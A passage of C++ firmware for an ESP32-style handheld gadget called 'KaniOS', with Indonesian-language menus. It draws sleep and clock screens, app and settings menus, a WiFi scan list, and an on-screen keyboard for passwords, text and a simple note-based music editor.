  tft.print("Timeout 180 dtk.");
}

static void tftDrawWifiConfigFailed() {
  tft.fillScreen(UI_BG);
  tft.setTextColor(UI_WARN);
  tft.setTextSize(2);
  tft.setCursor(20, 90);
  tft.print("WiFi setup timeout");
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(28, 120);
  tft.print("Device restart...");
}

static const char *sleepModeText(SleepMode mode) {
  switch (mode) {
    case SLEEP_SCREEN_ONLY: return "SCR ONLY";
    case SLEEP_LED_ONLY: return "LED ONLY";
    case SLEEP_STANDBY_SCREEN: return "STANDBY";
    case SLEEP_BMP_CLOCK: return "BMP CLK";
    case SLEEP_GIF_CLOCK: return "GIF CLK";
    case SLEEP_BOTH:
    default: return "SCR+LED";
  }
}

static bool sleepModeKeepsScreenOn(SleepMode mode) {
  return mode == SLEEP_LED_ONLY || mode == SLEEP_STANDBY_SCREEN || mode == SLEEP_BMP_CLOCK || mode == SLEEP_GIF_CLOCK;
}

static const char *clockDisplayModeText(ClockDisplayMode mode) {
  switch (mode) {
    case CLOCK_VIEW_TIME_DATE: return "JAM + TGL";
    case CLOCK_VIEW_DATE: return "TANGGAL";
    case CLOCK_VIEW_TIME:
    default: return "JAM";
  }
}

static bool isSleepActive() {
  return tftSleeping || matrixSleeping;
}

static void tftDrawSleepOverlay40(int16_t x, int16_t y, int16_t w, int16_t h, int16_t radius) {
  for (int16_t py = y; py < y + h; py++) {
    for (int16_t px = x; px < x + w; px++) {
      bool inside = true;
      if (px < x + radius && py < y + radius) {
        int16_t dx = px - (x + radius);
        int16_t dy = py - (y + radius);
        inside = (dx * dx + dy * dy) <= radius * radius;
      } else if (px >= x + w - radius && py < y + radius) {
        int16_t dx = px - (x + w - radius - 1);
        int16_t dy = py - (y + radius);
        inside = (dx * dx + dy * dy) <= radius * radius;
      } else if (px < x + radius && py >= y + h - radius) {
        int16_t dx = px - (x + radius);
        int16_t dy = py - (y + h - radius - 1);
        inside = (dx * dx + dy * dy) <= radius * radius;
      } else if (px >= x + w - radius && py >= y + h - radius) {
        int16_t dx = px - (x + w - radius - 1);
        int16_t dy = py - (y + h - radius - 1);
        inside = (dx * dx + dy * dy) <= radius * radius;
      }
      if (!inside) continue;
      if (((px + py) % 5) < 2) tft.drawPixel(px, py, ST77XX_BLACK);
    }
  }
}

static void tftDrawSleepStateNotice() {
  if (tftSleeping) return;
  if (sleepMode == SLEEP_STANDBY_SCREEN) {
    tftDrawStandbySleepScreen();
    return;
  }
  if (sleepMode == SLEEP_BMP_CLOCK) {
    tftDrawBmpSleepClockScreen();
    return;
  }
  if (sleepMode == SLEEP_GIF_CLOCK) {
    tftDrawGifSleepClockScreen();
    return;
  }
  tft.fillScreen(UI_BG);
  tft.setTextWrap(false);
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(2);
  tft.setCursor(12, 14);
  tft.print("Sleep Mode");
  tft.drawFastHLine(10, 38, 220, UI_LINE);
  tft.setTextColor(UI_ACCENT);
  tft.setTextSize(2);
  tft.setCursor(28, 84);
  tft.print(sleepModeText(sleepMode));
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(28, 126);
  tft.print("OK untuk bangunkan.");
  tft.setCursor(28, 144);
  tft.print("Setting>Sleep ubah mode.");
}

static void tftDrawStandbySleepScreen() {
  tft.fillScreen(0x0000);
  for (int y = 0; y < 240; y += 12) {
    uint16_t band = (y % 24 == 0) ? 0x0841 : 0x1082;
    tft.fillRect(0, y, 240, 12, band);
  }
  tft.drawRoundRect(18, 40, 204, 150, 16, UI_ACCENT);
  tft.drawRoundRect(24, 46, 192, 138, 14, UI_LINE);
  tft.setTextWrap(false);
  String stamp = timeDisplayText();
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(clockDisplayMode == CLOCK_VIEW_TIME ? 4 : 2);
  int16_t bx, by;
  uint16_t bw, bh;
  tft.getTextBounds(stamp, 0, 0, &bx, &by, &bw, &bh);
  int16_t x = (240 - (int16_t)bw) / 2;
  if (x < 20) x = 20;
  tft.setCursor(x, clockDisplayMode == CLOCK_VIEW_TIME ? 104 : 110);
  tft.print(stamp);
}

static void tftDrawBmpSleepClockScreen() {
  tft.fillScreen(ST77XX_BLACK);
  int16_t bmpW = 0;
  int16_t bmpH = 0;
  int16_t drawX = 0;
  int16_t drawY = 0;
  bool hasBmp = bmpGetSize(BMP_PATH, bmpW, bmpH);
  if (hasBmp) {
    drawX = (tft.width() - bmpW) / 2;
    drawY = (tft.height() - bmpH) / 2;
    hasBmp = tftDrawBmpFromFS(BMP_PATH, drawX, drawY);
  }
  if (!hasBmp) {
    tftDrawStandbySleepScreen();
    tft.setTextSize(1);
    tft.setTextColor(UI_WARN);
    tft.setCursor(74, 182);
    tft.print("BMP not found");
    return;
  }
  tftDrawSleepOverlay40(48, 86, 144, 68, 14);
  String stamp = timeDisplayText();
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(clockDisplayMode == CLOCK_VIEW_TIME ? 3 : 2);
  int16_t bx, by;
  uint16_t bw, bh;
  tft.getTextBounds(stamp, 0, 0, &bx, &by, &bw, &bh);
  int16_t x = (240 - (int16_t)bw) / 2;
  if (x < 52) x = 52;
  tft.setCursor(x, clockDisplayMode == CLOCK_VIEW_TIME ? 118 : 122);
  tft.print(stamp);
}

static void tftDrawGifSleepClockScreen() {
  if (!LittleFS.exists(GIF_PATH)) {
    tftDrawStandbySleepScreen();
    tft.setTextSize(1);
    tft.setTextColor(UI_WARN);
    tft.setCursor(74, 182);
    tft.print("GIF not found");
    return;
  }
  // Try to open and draw a single frame of the GIF centered-ish on screen
  bool ok = gif.open(GIF_PATH, GIFOpenFile, GIFCloseFile, GIFReadFile, GIFSeekFile, GIFDraw);
  if (!ok) {
    tftDrawStandbySleepScreen();
    tft.setTextSize(1);
    tft.setTextColor(UI_WARN);
    tft.setCursor(60, 182);
    tft.print("GIF open failed");
    return;
  }
  tft.fillScreen(ST77XX_BLACK);
  int nextDelay = 0;
  // draw at least one frame
  (void)gif.playFrame(false, &nextDelay);
  // close resources used by AnimatedGIF
  gif.close();
  if (gifFsFile) gifFsFile.close();

  // overlay clock box
  tftDrawSleepOverlay40(48, 86, 144, 68, 14);
  String stamp = timeDisplayText();
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(clockDisplayMode == CLOCK_VIEW_TIME ? 3 : 2);
  int16_t bx, by;
  uint16_t bw, bh;
  tft.getTextBounds(stamp, 0, 0, &bx, &by, &bw, &bh);
  int16_t x = (240 - (int16_t)bw) / 2;
  if (x < 52) x = 52;
  tft.setCursor(x, clockDisplayMode == CLOCK_VIEW_TIME ? 118 : 122);
  tft.print(stamp);
}

static void tftRefreshSleepScreen() {
  if (!isSleepActive() || tftSleeping) return;
  tftDrawSleepStateNotice();
}

static void tftDrawHeader(const char *title) {
  tft.fillScreen(UI_BG);
  tft.setTextWrap(false);
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(2);
  tft.setCursor(12, 10);
  tft.print(title);
  tftDrawTopRightDateTime(false);
  tft.drawFastHLine(10, 34, 220, UI_LINE);
}

static void tftDrawTopRightDateTime(bool clearBg) {
  String text = timeDisplayText();
  uint8_t textSize = (clockDisplayMode == CLOCK_VIEW_TIME) ? 2 : 1;
  int16_t topY = (textSize == 2) ? 10 : 16;
  if (clearBg) tft.fillRect(108, 8, 120, 18, UI_BG);
  tft.setTextColor(UI_ACCENT);
  tft.setTextSize(textSize);
  int16_t x = tftRightAlignTextX(text, 228, 108);
  tft.setCursor(x, topY);
  tft.print(text);
}

static uint8_t tftListFirstVisible(uint8_t selectedIndex, uint8_t itemCount, uint8_t visibleCount) {
  if (itemCount <= visibleCount || visibleCount == 0) return 0;
  if (selectedIndex < visibleCount) return 0;
  uint8_t firstVisible = selectedIndex - visibleCount + 1;
  uint8_t maxFirst = itemCount - visibleCount;
  return min(firstVisible, maxFirst);
}

static void tftDrawListScrollbar(int16_t x, int16_t y, int16_t h, uint8_t itemCount, uint8_t visibleCount, uint8_t firstVisible) {
  if (itemCount <= visibleCount || visibleCount == 0) return;
  tft.drawRoundRect(x, y, 6, h, 3, UI_LINE);
  int thumbH = max(18, (visibleCount * (h - 4)) / (int)itemCount);
  int thumbTravel = (h - 4) - thumbH;
  int thumbY = y + 2;
  if (thumbTravel > 0) thumbY += (firstVisible * thumbTravel) / (itemCount - visibleCount);
  tft.fillRoundRect(x + 1, thumbY, 4, thumbH, 2, UI_ACCENT);
}

static int16_t tftRightAlignTextX(const String &value, int16_t rightX, int16_t minX) {
  int16_t x1, y1;
  uint16_t w, h;
  tft.getTextBounds(value, 0, 0, &x1, &y1, &w, &h);
  int16_t valueX = rightX - (int16_t)w;
  if (valueX < minX) valueX = minX;
  return valueX;
}

static void drawIconGlyph(UiIcon icon, int16_t x, int16_t y, uint16_t color) {
  switch (icon) {
    case ICON_GAME:
      tft.fillTriangle(x + 18, y + 6, x + 4, y + 26, x + 32, y + 26, color);
      tft.drawFastVLine(x + 18, y, 5, UI_WARN);
      tft.drawFastVLine(x + 8, y + 2, 4, UI_OK);
      tft.drawFastVLine(x + 28, y + 2, 4, UI_OK);
      break;
    case ICON_MEDIA:
      tft.drawRoundRect(x + 3, y + 4, 32, 24, 4, color);
      tft.fillCircle(x + 28, y + 10, 3, UI_WARN);
      tft.drawLine(x + 7, y + 24, x + 14, y + 15, color);
      tft.drawLine(x + 14, y + 15, x + 20, y + 22, color);
      tft.drawLine(x + 20, y + 22, x + 31, y + 13, color);
      break;
    case ICON_SETTINGS:
      tft.drawCircle(x + 18, y + 16, 8, color);
      for (int i = 0; i < 8; i++) {
        float ang = i * 0.785398f;
        int x1 = x + 18 + (int)(cosf(ang) * 10.0f);
        int y1 = y + 16 + (int)(sinf(ang) * 10.0f);
        int x2 = x + 18 + (int)(cosf(ang) * 15.0f);
        int y2 = y + 16 + (int)(sinf(ang) * 15.0f);
        tft.drawLine(x1, y1, x2, y2, color);
      }
      break;
    case ICON_TOOLS:
      tft.drawRoundRect(x + 5, y + 5, 26, 22, 4, color);
      tft.drawFastHLine(x + 9, y + 12, 18, color);
      tft.drawFastHLine(x + 9, y + 18, 18, color);
      tft.drawFastVLine(x + 14, y + 9, 12, color);
      tft.drawFastVLine(x + 22, y + 9, 12, color);
      break;
    case ICON_SLEEP:
      tft.drawCircle(x + 18, y + 16, 9, color);
      tft.fillCircle(x + 22, y + 14, 9, UI_BG);
      tft.drawPixel(x + 27, y + 11, color);
      tft.drawPixel(x + 29, y + 14, color);
      break;
    case ICON_SONG:
      tft.fillCircle(x + 13, y + 23, 4, color);
      tft.fillCircle(x + 25, y + 20, 4, UI_ACCENT);
      tft.drawFastVLine(x + 13, y + 7, 15, color);
      tft.drawFastVLine(x + 25, y + 6, 14, UI_ACCENT);
      tft.drawLine(x + 13, y + 7, x + 25, y + 6, color);
      break;
  }
}

static void tftDrawIconMenu() {
  tftDrawHeader("KaniOS \xE0");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:pilih OK:buka Sleep:OK");

  String values[UI_ICON_COUNT] = {
    String("4 apps"), //game
    String(LittleFS.exists(BMP_PATH) ? "BMP" : "-") + "/" + String(LittleFS.exists(GIF_PATH) ? "GIF" : "-"), //media
    String("8 set"), //setting
    String("11 apps"), //tools
    tftSleeping ? String("SLEEP") : String("READY"), //sleep
    songPlaying ? String(songName(currentSong)) : String("PILIH")
  };

  const char *labels[UI_ICON_COUNT] = {
    "GAME", "MEDIA", "OPSI", "ALAT", "SLEEP", "LAGU"
  };

  const int cardW = 68;
  const int cardH = 54;
  const int gapX = 8;
  const int gapY = 8;
  const int startX = 10;
  const int startY = 56;

  for (int idx = 0; idx < UI_ICON_COUNT; idx++) {
    int row = idx / 3;
    int col = idx % 3;
    int x = startX + col * (cardW + gapX);
    int y = startY + row * (cardH + gapY);
    bool selected = (idx == uiIndex);
    uint16_t fill = selected ? UI_CARD_SEL : UI_CARD;
    uint16_t line = selected ? UI_ACCENT : UI_LINE;
    uint16_t text = selected ? UI_TEXT : UI_MUTED;

    tft.fillRoundRect(x, y, cardW, cardH, 9, fill);
    tft.drawRoundRect(x, y, cardW, cardH, 9, line);
    drawIconGlyph((UiIcon)idx, x + 5, y + 6, text);

    tft.setTextSize(1);
    tft.setTextColor(text);
    tft.setCursor(x + 35, y + 13);
    tft.print(labels[idx]);
    tft.setCursor(x + 35, y + 29);
    tft.print(values[idx]);
  }

  tftDrawFooterIp();
}

static void tftDrawMediaMenu() {
  tftDrawHeader("Media");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:nav - OK:Pilih - OK (hold):back");
  const char *labels[MEDIA_ITEM_COUNT] = {"BMP Viewer", "GIF Player", "Camera"};
  String values[MEDIA_ITEM_COUNT] = {
    LittleFS.exists(BMP_PATH) ? String("READY") : String("EMPTY"),
    LittleFS.exists(GIF_PATH) ? String("READY") : String("EMPTY"),
    WiFi.isConnected() ? String("READY") : String("NO WIFI")
  };
  const uint8_t visibleCount = 3;
  uint8_t firstVisible = tftListFirstVisible(mediaMenuIndex, MEDIA_ITEM_COUNT, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= MEDIA_ITEM_COUNT) break;
    int y = 62 + row * 58;
    bool selected = (i == mediaMenuIndex);
    tft.fillRoundRect(12, y, 216, 46, 10, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 46, 10, selected ? UI_ACCENT : UI_LINE);
    tft.setTextSize(2);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setCursor(22, y + 8);
    tft.print(labels[i]);
    tft.setTextSize(1);
    tft.setCursor(22, y + 29);
    tft.print(values[i]);
  }
  tftDrawListScrollbar(226, 64, 150, MEDIA_ITEM_COUNT, visibleCount, firstVisible);
}

static void tftDrawSettingsMenu() {
  tftDrawHeader("Setting");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:nav - OK:Pilih - OK (hold):back");
  tft.setTextWrap(false);
  const char *labels[SETTING_ITEM_COUNT] = {"TFT Brightness", "LED Brightness", "UTC", "WiFi", "IMU", "UI Sound", "Sleep", "Clock", "Camera URL", "Buzzer Vol"};
  String values[SETTING_ITEM_COUNT] = {
    String(gTftBacklight),
    String(gBrightness),
    fmtUtcOffset(),
    wifiSettingsStatusText(),
    imuOn ? String("ON") : String("OFF"),
    uiSfxEnabled ? String("ON") : String("OFF"),
    String(sleepModeText(sleepMode)),
    String(clockDisplayModeText(clockDisplayMode)),
    cameraUrl,
    String(buzzerVolume)
  };
  const uint8_t visibleCount = 5;
  uint8_t firstVisible = tftListFirstVisible(settingsMenuIndex, SETTING_ITEM_COUNT, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= SETTING_ITEM_COUNT) break;
    int y = 54 + row * 34;
    bool selected = (i == settingsMenuIndex);
    tft.fillRoundRect(10, y, 212, 28, 8, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(10, y, 212, 28, 8, selected ? UI_ACCENT : UI_LINE);
    tft.setTextSize(1);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setCursor(18, y + 10);
    tft.print(labels[i]);
    tft.setCursor(tftRightAlignTextX(values[i], 214, 128), y + 10);
    tft.print(values[i]);
  }
  tftDrawListScrollbar(226, 56, 160, SETTING_ITEM_COUNT, visibleCount, firstVisible);
}

static void tftDrawWifiListMenu() {
  tftDrawHeader("WiFi Scan");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:nav - OK:Pilih - OK (hold):back");
  bool hasSaved = savedWifiSsid.length() > 0;
  const uint8_t rescanIndex = wifiScanCount;
  const uint8_t reconnectIndex = wifiScanCount + (hasSaved ? 1 : 0);
  const uint8_t forgetIndex = wifiScanCount + (hasSaved ? 2 : 0);
  const uint8_t itemCount = wifiScanCount + 1 + (hasSaved ? 2 : 0);
  const uint8_t visibleCount = 4;
  uint8_t firstVisible = tftListFirstVisible(wifiListIndex, itemCount, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= itemCount) break;
    int y = 58 + row * 42;
    bool selected = (i == wifiListIndex);
    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    if (i == rescanIndex) {
      tft.setTextSize(2);
      tft.setCursor(24, y + 8);
      tft.print("Rescan WiFi");
    } else if (hasSaved && i == reconnectIndex) {
      tft.setTextSize(2);
      tft.setCursor(24, y + 6);
      tft.print("Reconnect");
      tft.setTextSize(1);
      tft.setCursor(24, y + 22);
      tft.print(savedWifiSsid);
    } else if (hasSaved && i == forgetIndex) {
      tft.setTextSize(2);
      tft.setCursor(24, y + 6);
      tft.print("Forget WiFi");
      tft.setTextSize(1);
      tft.setCursor(24, y + 22);
      tft.print(savedWifiSsid);
    } else {
      tft.setTextSize(2);
      tft.setCursor(24, y + 6);
      tft.print(wifiScanSsids[i]);
      tft.setTextSize(1);
      tft.setCursor(24, y + 22);
      
      if (hasSaved && wifiScanSsids[i] == savedWifiSsid) {
        tft.print("SAVED");
      } else {
        tft.print(wifiScanOpen[i] ? "OPEN" : "LOCK");
      }
      
      tft.setCursor(78, y + 22);
      tft.print(String(wifiScanRssi[i]) + " dBm");
    }
  }
  if (wifiStatusMessage.length() > 0) {
    tft.fillRect(12, 228, 216, 10, UI_BG);
    tft.setTextSize(1);
    tft.setTextColor(wifiLastConnectOk ? UI_OK : UI_WARN);
    tft.setCursor(12, 230);
    tft.print(wifiStatusMessage);
  }
  if (savedWifiSsid.length() > 0) {
    tft.fillRect(12, 46, 216, 10, UI_BG);
    tft.setTextSize(1);
    tft.setTextColor(UI_ACCENT);
    tft.setCursor(12, 48);
    tft.print(String("Saved: ") + savedWifiSsid);
  }
  tftDrawListScrollbar(226, 60, 140, itemCount, visibleCount, firstVisible);
}

static uint8_t wifiKeyboardRowCount() {
  return 4;
}

static uint8_t wifiKeyboardRowSize(WifiKeyboardMode mode, uint8_t row) {
  switch (mode) {
    case WIFI_KEYS_NUMBER:
      if (row == 0) return 10;
      if (row == 1) return 9;
      if (row == 2) return 8;
      return 4;
    case WIFI_KEYS_SYMBOL:
      if (row == 0) return 10;
      if (row == 1) return 9;
      if (row == 2) return 8;
      return 4;
    case WIFI_KEYS_ALPHA:
    default:
      if (row == 0) return 10;
      if (row == 1) return 9;
      if (row == 2) return 8;
      return 4;
  }
}

static String wifiKeyboardLabel(WifiKeyboardMode mode, bool shift, uint8_t row, uint8_t col) {
  static const char *const alphaRow0[] = {"q","w","e","r","t","y","u","i","o","p"};
  static const char *const alphaRow1[] = {"a","s","d","f","g","h","j","k","l"};
  static const char *const alphaRow2[] = {"Aa","z","x","c","v","b","n","m"};
  static const char *const alphaRow3[] = {"123","DEL","SPC","ENTR"};
  static const char *const numRow0[] = {"1","2","3","4","5","6","7","8","9","0"};
  static const char *const numRow1[] = {"-","/",":",";","(",")","&","@","."};
  static const char *const numRow2[] = {"SYM","_","?","!",",","'","\"","#"};
  static const char *const numRow3[] = {"ABC","DEL","SPC","ENTR"};
  static const char *const symRow0[] = {"[","]","{","}","#","%","^","*","+","="};
  static const char *const symRow1[] = {"_","\\","|","~","<",">","$","`","."};
  static const char *const symRow2[] = {"ABC","/",":",";",",","!","?","-"};
  static const char *const symRow3[] = {"123","DEL","SPC","ENTR"};

  const char *label = "";
  if (mode == WIFI_KEYS_ALPHA) {
    if (row == 0) label = alphaRow0[col];
    else if (row == 1) label = alphaRow1[col];
    else if (row == 2) label = alphaRow2[col];
    else label = alphaRow3[col];
    if (shift && strlen(label) == 1 && label[0] >= 'a' && label[0] <= 'z') {
      char upper[2] = {(char)(label[0] - 32), 0};
      return String(upper);
    }
    return String(label);
  }
  if (mode == WIFI_KEYS_NUMBER) {
    if (row == 0) label = numRow0[col];
    else if (row == 1) label = numRow1[col];
    else if (row == 2) label = numRow2[col];
    else label = numRow3[col];
    return String(label);
  }
  if (row == 0) label = symRow0[col];
  else if (row == 1) label = symRow1[col];
  else if (row == 2) label = symRow2[col];
  else label = symRow3[col];
  return String(label);
}

static void wifiKeyboardClampSelection() {
  uint8_t rowCount = wifiKeyboardRowCount();
  if (wifiKeyboardRow >= rowCount) wifiKeyboardRow = rowCount - 1;
  uint8_t rowSize = wifiKeyboardRowSize(wifiKeyboardMode, wifiKeyboardRow);
  if (rowSize == 0) wifiKeyboardCol = 0;
  else if (wifiKeyboardCol >= rowSize) wifiKeyboardCol = rowSize - 1;
}

static void wifiKeyboardMoveRow(int delta) {
  int nextRow = (int)wifiKeyboardRow + delta;
  if (nextRow < 0) nextRow = (int)wifiKeyboardRowCount() - 1;
  if (nextRow >= wifiKeyboardRowCount()) nextRow = 0;
  wifiKeyboardRow = (uint8_t)nextRow;
  wifiKeyboardClampSelection();
}

static void wifiKeyboardMoveCol(int delta) {
  uint8_t rowSize = wifiKeyboardRowSize(wifiKeyboardMode, wifiKeyboardRow);
  if (rowSize == 0) return;
  int nextCol = (int)wifiKeyboardCol + delta;
  if (nextCol < 0) nextCol = rowSize - 1;
  if (nextCol >= rowSize) nextCol = 0;
  wifiKeyboardCol = (uint8_t)nextCol;
}

static void wifiKeyboardActivate() {
  String key = wifiKeyboardLabel(wifiKeyboardMode, wifiKeyboardShift, wifiKeyboardRow, wifiKeyboardCol);
  if (wifiKeyboardMode == WIFI_KEYS_ALPHA && wifiKeyboardRow == 2 && wifiKeyboardCol == 0) {
    wifiKeyboardShift = !wifiKeyboardShift;
    wifiStatusMessage = wifiKeyboardShift ? "Shift ON" : "Shift OFF";
    return;
  }
  if (wifiKeyboardMode == WIFI_KEYS_ALPHA && wifiKeyboardRow == 3 && wifiKeyboardCol == 0) {
    wifiKeyboardMode = WIFI_KEYS_NUMBER;
    wifiKeyboardShift = false;
    wifiKeyboardRow = 0;
    wifiKeyboardCol = 0;
    wifiStatusMessage = "Mode 123";
    return;
  }
  if (wifiKeyboardMode == WIFI_KEYS_NUMBER && wifiKeyboardRow == 2 && wifiKeyboardCol == 0) {
    wifiKeyboardMode = WIFI_KEYS_SYMBOL;
    wifiKeyboardRow = 0;
    wifiKeyboardCol = 0;
    wifiStatusMessage = "Mode SYM";
    return;
  }
  if ((wifiKeyboardMode == WIFI_KEYS_NUMBER && wifiKeyboardRow == 3 && wifiKeyboardCol == 0) ||
      (wifiKeyboardMode == WIFI_KEYS_SYMBOL && wifiKeyboardRow == 2 && wifiKeyboardCol == 0)) {
    wifiKeyboardMode = WIFI_KEYS_ALPHA;
    wifiKeyboardRow = 0;
    wifiKeyboardCol = 0;
    wifiStatusMessage = "Mode ABC";
    return;
  }
  if (wifiKeyboardMode == WIFI_KEYS_SYMBOL && wifiKeyboardRow == 3 && wifiKeyboardCol == 0) {
    wifiKeyboardMode = WIFI_KEYS_NUMBER;
    wifiKeyboardRow = 0;
    wifiKeyboardCol = 0;
    wifiStatusMessage = "Mode 123";
    return;
  }
  if (wifiKeyboardRow == 3 && wifiKeyboardCol == 1) {
    if (wifiPasswordBuffer.length() > 0) wifiPasswordBuffer.remove(wifiPasswordBuffer.length() - 1);
    wifiStatusMessage = String("Len ") + wifiPasswordBuffer.length();
    return;
  }
  if (wifiKeyboardRow == 3 && wifiKeyboardCol == 2) {
    if (wifiPasswordBuffer.length() < 32) wifiPasswordBuffer += ' ';
    wifiStatusMessage = String("Len ") + wifiPasswordBuffer.length();
    return;
  }
  if (wifiKeyboardRow == 3 && wifiKeyboardCol == 3) {
    (void)wifiConnectSelectedNetwork();
    return;
  }
  if (wifiPasswordBuffer.length() < 32 && key.length() > 0) {
    wifiPasswordBuffer += key;
    wifiStatusMessage = String("Len ") + wifiPasswordBuffer.length();
  }
}

static void textKeyboardActivate() {
  String key = wifiKeyboardLabel(textKeyboardMode, textKeyboardShift, textKeyboardRow, textKeyboardCol);
  if (textKeyboardMode == WIFI_KEYS_ALPHA && textKeyboardRow == 2 && textKeyboardCol == 0) {
    textKeyboardShift = !textKeyboardShift; return;
  }
  if (textKeyboardMode == WIFI_KEYS_ALPHA && textKeyboardRow == 3 && textKeyboardCol == 0) {
    textKeyboardMode = WIFI_KEYS_NUMBER; textKeyboardShift = false;
    textKeyboardRow = 0; textKeyboardCol = 0; return;
  }
  if (textKeyboardMode == WIFI_KEYS_NUMBER && textKeyboardRow == 2 && textKeyboardCol == 0) {
    textKeyboardMode = WIFI_KEYS_SYMBOL;
    textKeyboardRow = 0; textKeyboardCol = 0; return;
  }
  if ((textKeyboardMode == WIFI_KEYS_NUMBER && textKeyboardRow == 3 && textKeyboardCol == 0) ||
      (textKeyboardMode == WIFI_KEYS_SYMBOL && textKeyboardRow == 2 && textKeyboardCol == 0)) {
    textKeyboardMode = WIFI_KEYS_ALPHA;
    textKeyboardRow = 0; textKeyboardCol = 0; return;
  }
  if (textKeyboardMode == WIFI_KEYS_SYMBOL && textKeyboardRow == 3 && textKeyboardCol == 0) {
    textKeyboardMode = WIFI_KEYS_NUMBER;
    textKeyboardRow = 0; textKeyboardCol = 0; return;
  }
  if (textKeyboardRow == 3 && textKeyboardCol == 1) {
    if (textKeyboardBuffer.length() > 0) textKeyboardBuffer.remove(textKeyboardBuffer.length() - 1);
    return;
  }
  if (textKeyboardRow == 3 && textKeyboardCol == 2) {
    if (textKeyboardBuffer.length() < 64) textKeyboardBuffer += ' ';
    return;
  }
  if (textKeyboardRow == 3 && textKeyboardCol == 3) {
    // ENTR clicked
    if (textKeyboardTarget == TEXT_TARGET_MATRIX) {
      matrixTextSaved = textKeyboardBuffer;
      uiEnter(UI_MATRIX_TEXT_MENU);
    } else if (textKeyboardTarget == TEXT_TARGET_SONG_NOTE) {
      String clean = textKeyboardBuffer;
      clean.trim();
      if (clean.length() == 0) clean = "default";
      clean.replace("/", "_");
      clean.replace("\\", "_");
      if (!clean.endsWith(".note")) clean += ".note";
      if (noteLoadByName(clean)) {
        songStop();
        noteStartPlay();
      }
      uiEnter(UI_SONG_MENU);
    } else if (textKeyboardTarget == TEXT_TARGET_CAMERA_URL) {
      String s = textKeyboardBuffer;
      s.trim();
      if (s.length() > 0) {
        cameraUrl = s;
        (void)cameraUrlSaveToFS();
        cameraStop();
      }
      uiMarkDirty();
      uiEnter(UI_SETTINGS_MENU);
    } else {
      String clean = textKeyboardBuffer;
      clean.trim();
      if (clean.length() == 0) clean = "default";
      clean.replace("/", "_");
      clean.replace("\\", "_");
      if (!clean.endsWith(".note")) clean += ".note";
      if (textKeyboardTarget == TEXT_TARGET_NOTE_SAVE) {
        (void)noteSaveByName(clean);
      } else if (textKeyboardTarget == TEXT_TARGET_NOTE_LOAD) {
        (void)noteLoadByName(clean);
      }
      uiEnter(UI_NOTE_EDITOR_MAIN);
    }
    return;
  }
  if (textKeyboardBuffer.length() < 64 && key.length() > 0) {
    textKeyboardBuffer += key;
  }
}

static void fileViewerLoadFromPath(const String &path) {
  fileViewerLineCount = 0;
  fileViewerScrollLines = 0;
  File f = LittleFS.open(path, "r");
  if (!f) return;
  String line = "";
  while (f.available() && fileViewerLineCount < 64) {
    char c = (char)f.read();
    if (c == '\r') continue;
    if (c == '\n') {
      fileViewerLines[fileViewerLineCount++] = line;
      line = "";
      continue;
    }
    line += c;
    if (line.length() >= 38) {
      fileViewerLines[fileViewerLineCount++] = line;
      line = "";
    }
  }
  if (line.length() > 0 && fileViewerLineCount < 64) fileViewerLines[fileViewerLineCount++] = line;
  if (fileViewerLineCount == 0) fileViewerLines[fileViewerLineCount++] = "(kosong)";
  f.close();
}

static void noteEnsureDir() {
  if (!LittleFS.exists("/notes")) LittleFS.mkdir("/notes");
}

struct NoteOption {
  const char* name;
  uint16_t freq;
};

static const NoteOption notePitchTable[] = {
  {"REST", REST},
  {"C4", NOTE_C4}, {"CS4", NOTE_CS4}, {"D4", NOTE_D4}, {"DS4", NOTE_DS4},
  {"E4", NOTE_E4}, {"F4", NOTE_F4}, {"FS4", NOTE_FS4}, {"G4", NOTE_G4},
  {"GS4", NOTE_GS4}, {"A4", NOTE_A4}, {"AS4", NOTE_AS4}, {"B4", NOTE_B4},
  {"C5", NOTE_C5}, {"CS5", NOTE_CS5}, {"D5", NOTE_D5}, {"DS5", NOTE_DS5},
  {"E5", NOTE_E5}, {"F5", NOTE_F5}, {"FS5", NOTE_FS5}, {"G5", NOTE_G5},
  {"A5", NOTE_A5}, {"B5", NOTE_B5}, {"C6", NOTE_C6}
};
static const uint8_t notePitchCount = sizeof(notePitchTable) / sizeof(notePitchTable[0]);
static const uint16_t noteDurTable[] = {100, 200, 300, 400, 600, 800, 1000};
static const uint8_t noteDurCount = sizeof(noteDurTable) / sizeof(noteDurTable[0]);

static uint8_t noteFindPitchIndex(uint16_t freq) {
  for (uint8_t i = 0; i < notePitchCount; i++) {
    if (notePitchTable[i].freq == freq) return i;
  }
  return 0;
}

static uint8_t noteFindDurIndex(uint16_t durMs) {
  for (uint8_t i = 0; i < noteDurCount; i++) {
    if (noteDurTable[i] == durMs) return i;
  }
  uint8_t nearest = 0;
  uint16_t best = 0xFFFF;
  for (uint8_t i = 0; i < noteDurCount; i++) {
    uint16_t d = (durMs > noteDurTable[i]) ? (durMs - noteDurTable[i]) : (noteDurTable[i] - durMs);
    if (d < best) { best = d; nearest = i; }
  }
  return nearest;
}

static void noteSyncPickerFromCursor() {
